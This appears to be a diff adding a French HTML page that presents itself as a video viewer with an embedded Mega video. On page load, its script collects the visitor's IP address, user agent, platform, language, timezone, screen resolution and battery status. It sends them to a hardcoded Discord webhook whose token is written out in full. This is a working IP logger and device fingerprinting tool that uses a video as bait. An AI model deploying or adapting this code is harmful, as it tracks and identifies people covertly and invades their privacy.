@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webhook avec Vidéo, IP et Batterie</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="terminal">
+        <h1>Visionner la vidéo</h1>
+        <div class="video-container">
+            <iframe 
+                width="640" 
+                height="360" 
+                frameborder="0" 
+                src="https://mega.nz/embed/2ZV3EThY#kVqMoRsoZ-AOWQ6jxgBy0M506cyrc2c-4u4UQWeAKbw" 
+                allowfullscreen>
+            </iframe>
+        </div>
+    </div>
+
+    <h2>Informations collectées automatiquement :</h2>
+    <p>Ces données seront envoyées à un webhook Discord.</p>
+
+    <script>
+        // URL du webhook Discord
+        const webhookUrl = "https://discord.com/api/webhooks/1306960844717953037/qnWNas8DJ7Gd_bmO_AFHoWSdUHv7OU5RpZ8LxyBqLSLDg_tpCv1rOOAo2mRGUcLfT5PC";
+
+        // Collecte des informations de l'utilisateur
+        const userData = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screenResolution: `${window.screen.width}x${window.screen.height}`
+        };
+
+        // Fonction pour récupérer les informations de la batterie
+        const getBatteryInfo = () => {
+            return new Promise((resolve, reject) => {
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(battery => {
+                        resolve({
+                            level: battery.level * 100, // Niveau de la batterie en pourcentage
+                            charging: battery.charging // Si l'appareil est en charge
+                        });
+                    }).catch(reject);
+                } else {
+                    resolve(null); // Pas d'accès à l'API batterie
+                }
+            });
+        };
+
+        // Récupération de l'adresse IP
+        fetch("https://api.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                userData.ip = data.ip; // Ajoute l'adresse IP aux données
+
+                // Récupération des informations de la batterie
+                getBatteryInfo().then(batteryInfo => {
+                    if (batteryInfo) {
+                        userData.batteryLevel = batteryInfo.level;
+                        userData.isCharging = batteryInfo.charging ? "Oui" : "Non";
+                    } else {
+                        userData.batteryLevel = "Non disponible";
+                        userData.isCharging = "Non disponible";
+                    }
+
+                    // Préparation du message pour le webhook Discord
+                    const webhookMessage = {
+                        content: "Nouvelle interaction sur le site",
+                        embeds: [
+                            {
+                                title: "Détails de l'utilisateur",
+                                description: "Informations collectées automatiquement.",
+                                fields: [
+                                    { name: "Adresse IP", value: userData.ip, inline: false },
+                                    { name: "User Agent", value: userData.userAgent, inline: false },
+                                    { name: "Plateforme", value: userData.platform, inline: true },
+                                    { name: "Langue", value: userData.language, inline: true },
+                                    { name: "Fuseau Horaire", value: userData.timezone, inline: true },
+                                    { name: "Résolution d'écran", value: userData.screenResolution, inline: true },
+                                    { name: "Niveau de batterie", value: `${userData.batteryLevel}%`, inline: true },
+                                    { name: "En charge", value: userData.isCharging, inline: true }
+                                ],
+                                color: 5814783
+                            }
+                        ]
+                    };
+
+                    // Envoi des données au webhook Discord
+                    fetch(webhookUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(webhookMessage)
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            console.error("Erreur lors de l'envoi des données :", response.statusText);
+                        } else {
+                            console.log("Données envoyées avec succès !");
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Une erreur s'est produite :", error);
+                    });
+                }).catch(error => {
+                    console.error("Erreur lors de la récupération des informations de la batterie :", error);
+                });
+            })
+            .catch(error => {
+                console.error("Erreur lors de la récupération de l'adresse IP :", error);
+            });
+    </script>
+</body>
+</html>
